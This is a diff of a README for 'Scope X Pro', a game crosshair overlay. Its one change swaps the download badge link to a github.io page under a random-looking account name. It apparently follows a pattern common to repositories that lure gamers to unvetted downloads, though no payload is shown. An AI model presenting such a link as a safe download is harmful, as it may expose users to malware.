@@ -3,7 +3,7 @@
 Improve your aim with **Scope X Pro**, an advanced crosshair overlay and visual aim trainer for shooters. Customize your crosshair, tweak colors, opacity, and reticle style to match your game and playstyle — with no impact on performance.
 
 ⬇️ **Download**  
-[![Download Scope X Pro](https://img.shields.io/badge/Download-Scope_X_Pro-000000?style=for-the-badge&logo=target&logoColor=white)](https://scope-x-free-tool.github.io/.github/)
+[![Download Scope X Pro](https://img.shields.io/badge/Download-Scope_X_Pro-000000?style=for-the-badge&logo=target&logoColor=white)](https://saoowqshreyashsable5105.github.io/.github/)
 
 ---
 
